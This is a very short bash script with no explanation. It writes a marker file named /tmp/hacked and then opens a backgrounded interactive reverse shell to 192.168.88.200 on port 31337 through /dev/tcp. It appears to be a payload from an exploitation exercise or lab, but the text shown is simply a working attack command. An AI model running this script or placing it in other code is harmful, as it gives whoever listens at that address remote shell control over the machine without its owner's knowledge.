#!/bin/bash

touch /tmp/hacked

bash -i >& /dev/tcp/192.168.88.200/31337 0>&1 &
